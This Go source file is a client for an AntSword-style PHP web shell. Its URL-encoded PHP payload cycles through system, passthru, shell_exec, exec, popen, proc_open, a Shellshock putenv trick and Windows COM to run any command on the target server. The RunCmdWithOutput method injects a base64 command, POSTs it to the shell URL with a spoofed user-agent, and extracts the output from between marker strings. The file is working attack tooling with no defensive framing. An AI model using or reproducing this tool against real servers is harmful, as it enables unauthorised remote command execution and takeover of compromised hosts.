package entity

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
)

const (
	MsgHeaderPrefix = "1e6fc87291a"
	MsgHeaderSuffix = "0197f45"
	UrlPayload      = `ant=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%221e6fc%22.%2287291a%22%3Becho%20%40asenc(%24output)%3Becho%20%22019%22.%227f45%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22t7b69fc0e26ff5%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22pcac14d96d523e%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22vc08caa272051b%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map('trim'%2Carray_map('strtolower'%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe('putenv')%20%26%26%20(fe('error_log')%20%7C%7C%20fe('mail')))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20'as')%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe('error_log'))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe('system'))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe('passthru'))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe('shell_exec'))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe('exec'))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe('popen'))%7B%24fp%3D%40popen(%24c%2C'r')%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe('proc_open'))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array('pipe'%2C%20'w')%2C%202%20%3D%3E%20array('pipe'%2C%20'w'))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe('antsystem'))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM('WScript.shell')%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&pcac14d96d523e=bZY2QgIi92YXIvd3d3L3B1YmxpYyI7cHdkO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ&t7b69fc0e26ff5=itL2Jpbi9zaA%3D%3D&vc08caa272051b=XM`
	Core            = "Y2QgIi92YXIvd3d3L3B1YmxpYyI7cHdkO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ"
	Method          = "POST"
)

var (
	RespRe  = regexp.MustCompile(fmt.Sprintf(`%s([\s\S]*)%s`, MsgHeaderPrefix, MsgHeaderSuffix))
	RRespRe = regexp.MustCompile(fmt.Sprintf(`%s|%s`, MsgHeaderPrefix, MsgHeaderSuffix))
)

type PHPEntity struct {
	Target  string
	Command string
}

func (e *PHPEntity) RunCmdWithOutput(cmd string) (string, error) {
	client := http.Client{Timeout: time.Second * 30}
	payload := strings.ReplaceAll(UrlPayload, Core, base64.RawStdEncoding.EncodeToString([]byte(cmd)))
	body := bytes.NewBuffer([]byte(payload))
	req, err := http.NewRequest(Method, e.Target, body) // "http://172.31.50.248:8080/ant.php"
	if err != nil {
		return "", err
	}
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len([]byte(payload))))
	req.ContentLength = int64(len([]byte(payload)))
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// gzip解码内容再进行读取
	gzipReader, err := gzip.NewReader(resp.Body)
	if err != nil {
		return "", err
	}
	defer gzipReader.Close()
	text, err := ioutil.ReadAll(gzipReader)
	if err != nil {
		return "", err
	}
	ss := RespRe.FindStringSubmatch(string(text))
	result := ss[0]
	result = RRespRe.ReplaceAllString(result, "")
	fmt.Println("===>", result)

	return result, nil
}
